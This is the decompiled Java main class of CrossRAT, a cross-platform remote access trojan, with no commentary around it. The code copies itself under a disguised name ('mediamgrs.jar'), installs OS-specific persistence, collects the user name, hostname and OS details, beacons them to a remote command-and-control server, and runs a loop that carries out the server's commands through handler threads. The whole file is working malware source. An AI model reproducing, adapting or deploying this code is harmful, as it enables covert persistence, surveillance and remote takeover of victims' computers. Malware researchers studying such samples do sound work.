package crossrat;

import java.awt.GraphicsEnvironment;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URL;
import java.net.URLDecoder;
import java.security.CodeSource;
import java.security.ProtectionDomain;
import java.util.UUID;
import java.util.prefs.Preferences;

public class client
{
  public static void main(String[] paramArrayOfString)
  {
    paramArrayOfString = a.c.b();
    Object localObject1 = System.getProperty(localObject1 = "java.io.tmpdir");
    Object localObject2 = URLDecoder.decode(localObject2 = client.class.getProtectionDomain().getCodeSource().getLocation().getPath(), "UTF-8");
    localObject2 = new File((String)localObject2);
    k.K = "";
    if (paramArrayOfString.a() == a.c.a)
    {
      k.K = localObject1 + "\\";
    }
    else if (paramArrayOfString.a() == a.c.b)
    {
      paramArrayOfString = System.getProperty("user.home");
      k.K = paramArrayOfString + "/Library/";
    }
    else
    {
      k.K = "/usr/var/";
    }
    paramArrayOfString = new File(k.K + "mediamgrs.jar");
    try
    {
      org.a.a.a.b.a((File)localObject2, paramArrayOfString);
    }
    catch (Exception localException1)
    {
      (localObject1 = localException1).printStackTrace();
    }
    Object localObject4;
    Object localObject5;
    try
    {
      paramArrayOfString = 1;
      localObject4 = paramArrayOfString.toString();
      paramArrayOfString = "mediamgrs";
      if ((localObject5 = a.c.b()).a() == a.c.a) {
        paramArrayOfString = new b.e(paramArrayOfString, (String)localObject4, true);
      } else if (((a.a)localObject5).a() == a.c.b) {
        paramArrayOfString = new b.c(paramArrayOfString, (String)localObject4, true);
      } else if ((((a.a)localObject5).d()) && (!GraphicsEnvironment.getLocalGraphicsEnvironment().isHeadlessInstance())) {
        paramArrayOfString = new b.d(paramArrayOfString, (String)localObject4, true);
      } else if (((a.a)localObject5).d()) {
        paramArrayOfString = new b.b(paramArrayOfString, (String)localObject4, true);
      } else {
        throw new RuntimeException("Unknown operating system " + ((a.a)localObject5).c());
      }
      paramArrayOfString.a();
    }
    catch (Exception localException2)
    {
      (localObject1 = localException2).printStackTrace();
    }
    if ((k.g = (k.h = Preferences.userRoot()).get("UID", null)) == null)
    {
      k.g = (k.f = UUID.randomUUID()).toString();
      k.h.put("UID", k.g);
    }
    localObject1 = System.getProperty("os.name");
    localObject2 = System.getProperty("os.version");
    paramArrayOfString = System.getProperty("user.name");
    Object localObject3 = (localObject3 = InetAddress.getLocalHost()).getHostName();
    localObject3 = paramArrayOfString + "^" + (String)localObject3;
    for (;;)
    {
      try
      {
        Socket localSocket;
        (localSocket = new Socket(k.b, k.c)).setSoTimeout(120000);
        k.k = localSocket;
        (paramArrayOfString = new DataOutputStream(localSocket.getOutputStream())).writeBytes(k.g + k.d + k.w + k.d + e.b() + k.d + (String)localObject1 + k.d + (String)localObject2 + k.d + (String)localObject3 + k.d + k.i + k.d + k.j + k.d + "&&&");
        BufferedReader localBufferedReader = new BufferedReader(new InputStreamReader(localSocket.getInputStream()));
        PrintStream localPrintStream = new PrintStream(localSocket.getOutputStream(), true);
        try
        {
          paramArrayOfString = paramArrayOfString = localBufferedReader.readLine();
          try
          {
            if ((localObject4 = paramArrayOfString.split("\\" + k.d))[0].equals(k.m))
            {
              new e();
              e.a();
              (localObject5 = new f()).start();
              continue;
            }
            if (localObject4[0].equals(k.n))
            {
              (paramArrayOfString = new c(localObject4[1])).start();
              continue;
            }
            if (localObject4[0].equals(k.o))
            {
              (paramArrayOfString = new a(localObject4[1])).start();
              continue;
            }
            if (localObject4[0].equals(k.p))
            {
              (paramArrayOfString = new b(localObject4[1], localObject4[2])).start();
              continue;
            }
            if (localObject4[0].equals(k.q))
            {
              (paramArrayOfString = new h(localObject4[1], localObject4[2])).start();
              continue;
            }
            if (localObject4[0].equals(k.r))
            {
              (paramArrayOfString = new d(k.b, k.c, localObject4[1], localObject4[2], localObject4[3], "0")).start();
              continue;
            }
            if (localObject4[0].equals(k.s))
            {
              (paramArrayOfString = new d(k.b, k.c, localObject4[1], localObject4[2], localObject4[3], "1")).start();
              continue;
            }
            if (localObject4[0].equals(k.t))
            {
              (paramArrayOfString = new g()).start();
              continue;
            }
            if (localObject4[0].equals(k.u))
            {
              (paramArrayOfString = new j(k.b, k.c)).start();
              continue;
            }
            if (localObject4[0].equals(k.v)) {
              (paramArrayOfString = new i(localObject4[1])).start();
            }
          }
          catch (Exception localException3) {}
          continue;
        }
        catch (Exception localException4)
        {
          System.out.println("ERROR");
          localSocket.close();
          localPrintStream.close();
          localBufferedReader.close();
          localBufferedReader.close();
          localPrintStream.close();
          localSocket.close();
        }
      }
      catch (Exception localException5)
      {
        try
        {
          Thread.sleep(5000L);
        }
        catch (InterruptedException localInterruptedException) {}
      }
    }
  }
}


/* Location:              C:\Users\sihadan\Desktop\CrossRAT\CrossRAT\CrossRat\hmar6.jar!\crossrat\client.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */